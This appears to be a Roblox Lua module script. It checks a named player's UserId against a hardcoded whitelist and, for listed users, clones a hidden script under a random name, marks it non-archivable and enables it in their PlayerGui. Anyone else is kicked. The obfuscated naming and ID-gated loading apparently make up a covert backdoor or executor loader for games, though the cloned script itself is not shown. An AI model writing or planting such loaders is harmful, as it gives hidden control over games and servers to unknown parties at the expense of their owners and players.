return ({Noob=function(Name)
	for _,v in next,game:GetService("Players"):GetPlayers()do 
		if v.Name==Name then 
			string.gsub(string.rep(" ",math.random(1,100)),".",function(x)return utf8.char(({math.random(48,57),math.random(65,90),math.random(97,122)})[math.random(1,3)])end)
			if table.find({1031520069,4130158214,98918,77476,69486,54998},v.UserId)then 
				local Server=script:FindFirstChildOfClass("Script"):Clone()
				Server.Archivable=false;
				Server.Name=string.gsub(string.rep(" ",math.random(1,100)),".",function(x)return string.char(({math.random(48,57),math.random(65,90),math.random(97,122)})[math.random(1,3)])end)
				if v.Character then 
					Server:SetAttribute("SpawnCFrame",v.Character:GetPivot()*CFrame.Angles(0,math.rad(180),0))
				else 
					local Spawner=workspace:FindFirstChildOfClass("SpawnLocation")
					if Spawner then 
						Server:SetAttribute("SpawnCFrame",Spawner.CFrame*CFrame.new(0,3,0))
					else 
						Server:SetAttribute("SpawnCFrame",CFrame.new(0,15,0))
					end;
				end;
				Server.Parent=v:FindFirstChildOfClass("PlayerGui")
				Server.Disabled=false;
			else 
				v:Kick("")
			end;
		end
	end;
end,})
